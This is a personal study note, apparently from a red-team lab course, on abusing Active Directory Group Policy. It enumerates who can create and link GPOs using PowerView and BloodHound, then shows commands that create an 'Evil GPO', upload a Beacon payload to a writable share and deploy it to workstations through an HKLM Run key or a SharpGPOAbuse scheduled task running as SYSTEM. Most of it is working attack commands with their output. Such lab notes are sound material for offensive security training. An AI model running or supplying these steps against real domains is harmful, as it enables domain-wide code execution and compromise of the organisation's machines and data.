---
creation date: September 25th 2022
last modified date: September 25th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Group Policy Abuse]]  
___

## Description:  

Group Policy is the central repository in a forest or domain that controls the configuration of computers and users. Group Policy Objects (GPOs) are sets of configurations that are applied to Organisational Units (OUs). Any users or computers that are members of the OU will have those configurations applied.


### Enumeration

^1ad490

This PowerView query will show the Security Identifiers (SIDs) of principals that can create new GPOs in the domain, which can be translated via `ConvertFrom-SID`.

```
beacon> powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : CreateChild
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125

DEV\1st Line Support

```

This query will return the principals that can write to the GP-Link attribute on OUs:
```
beacon> powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl

ObjectDN           : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Servers,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Tier 1,OU=Servers,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Tier 2,OU=Servers,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125
```

From this output, we can see that the **1st Line Support** domain group can both create new GPOs **and** link them to several OUs. This can lead to a privilege escalation if more privileged users are authenticated to any of the machines within those OUs. Also imagine if we could link GPOs to an OU containing sensitive file or database servers - we could use those GPOs to access those machines and subsequently the data stored on them.

You can also get a list of machines within an OU.

```
beacon> powershell Get-DomainComputer | ? { $_.DistinguishedName -match "OU=Tier 1" } | select DnsHostName

dnshostname            
-----------            
srv-1.dev.cyberbotic.io
```

This query will return any GPO in the domain, where a 4-digit RID has **WriteProperty**, **WriteDacl** or **WriteOwner**.

```
beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN={AD7EE1ED-CDC8-4994-AE0F-50BA8B264829},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1126

beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126
DEV\Developers

```

To resolve the ObjectDN:
```
beacon> powershell Get-DomainGPO -Name "{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}" -Properties DisplayName

displayname       
-----------       
PowerShell Logging
```

### Bloodhound enumeration
```
MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p
```

### Remote Server Administration Tools (RSAT)

^62d4b1

RSAT is a management component provided by Microsoft to help manage components in a domain.

The GroupPolicy module has several PowerShell cmdlets that can be used for administering GPOs, including:

-   New-GPO: Create a new, empty GPO.
-   New-GPLink: Link a GPO to a site, domain or OU.
-   Set-GPPrefRegistryValue: Configures a Registry preference item under either Computer or User Configuration.
-   Set-GPRegistryValue: Configures one or more registry-based policy settings under either Computer or User Configuration.
-   Get-GPOReport: Generates a report in either XML or HTML format.

You can check to see if the GroupPolicy module is installed with `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. In a pinch, you can install it with `Install-WindowsFeature –Name GPMC` as a local admin.

Create a new GPO and immediately link it to the target OU.

```
beacon> getuid
[*] You are DEV\jking

beacon> powershell New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"

GpoId       : d9de5634-cc47-45b5-ae52-e7370e4a4d22
DisplayName : Evil GPO
Enabled     : True
Enforced    : False
Target      : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Order       : 4
```

Being able to write anything, anywhere into the HKLM or HKCU hives presents different options for achieving code execution. One simple way is to create a new autorun value to execute a Beacon payload on boot.

You can find this writeable software share with PowerView:
```
beacon> powershell Find-DomainShare -CheckShareAccess

Name           Type Remark              ComputerName
----           ---- ------              ------------
software          0                     dc-2.dev.cyberbotic.io
```

Then upload beacon (put it on a remote share that everyone can access):
```
beacon> cd \\dc-2\software
beacon> upload C:\Payloads\pivot.exe
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 281kb    fil     03/10/2021 13:54:10   pivot.exe

```

Now create a new autorun value, when gpo gets updated (usually every few hours), it will be applied to all workstations.

```
beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "@COMSPEC@ /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString

DisplayName      : Evil GPO
DomainName       : dev.cyberbotic.io
Owner            : DEV\jking
Id               : d9de5634-cc47-45b5-ae52-e7370e4a4d22
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 5/26/2021 2:35:02 PM
ModificationTime : 5/26/2021 2:42:08 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 1, SysVol Version: 1
WmiFilter        :
```


### SharpGPOAbuse

^cfdd15

Not as oppsec as using built in tools like RSAT.

[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) allows a wider range of "abusive" configurations to be added to a GPO. It cannot create GPOs, so we must still do that with RSAT or modify one we already have write access to. In this example, we add an Immediate Scheduled Task to the PowerShell Logging GPO, which will execute as soon as it's applied.

```
beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Debug\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"

[+] Domain = dev.cyberbotic.io
[+] Domain Controller = dc-2.dev.cyberbotic.io
[+] Distinguished Name = CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
[+] GUID of "PowerShell Logging" is: {AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}
[+] Creating file \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```

Beacons will come in as the machines in the domain refresh their GPOs
___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 25th 2022 (06:12 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
